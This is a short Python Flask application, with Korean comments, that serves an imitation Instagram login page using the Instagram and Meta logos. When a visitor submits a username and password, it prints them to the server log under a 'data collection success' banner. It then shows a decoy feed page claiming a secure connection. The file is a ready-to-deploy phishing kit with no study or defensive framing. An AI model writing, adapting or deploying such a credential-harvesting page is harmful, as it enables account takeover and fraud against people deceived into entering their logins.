import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# 1. 로그인 페이지 (아이디, 비번 입력)
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인 • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
        .logo { width: 175px; margin-bottom: 40px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        .login-btn { width: 100%; padding: 7px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer-img { margin-top: 60px; width: 60px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <form action="/" method="POST">
            <input type="text" name="username" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" name="password" placeholder="비밀번호" required>
            <button type="submit" class="login-btn">로그인</button>
        </form>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" class="footer-img">
    </div>
</body>
</html>
"""

# 2. 완료 페이지 (피드 화면)
FEED_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="margin:0; background:#fafafa; font-family:sans-serif; text-align:center;">
    <div style="padding:20px; font-weight:bold; border-bottom:1px solid #dbdbdb; background:white;">Instagram</div>
    <div style="margin-top:50px;">
        <img src="https://picsum.photos/400/400" style="width:90%; max-width:400px; border:1px solid #dbdbdb;">
        <p><b>보안 연결이 완료되었습니다.</b></p>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_id = request.form.get('username')
        user_pw = request.form.get('password')

        # [핵심] flush=True를 넣어 로그에 즉시 강제 출력!!
        print("\n" + "="*30, flush=True)
        print(f"🔥 데이터 수집 성공! 🔥", flush=True)
        print(f"ID: {user_id}", flush=True)
        print(f"PW: {user_pw}", flush=True)
        print("="*30 + "\n", flush=True)

        return render_template_string(FEED_PAGE)
    
    return render_template_string(LOGIN_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
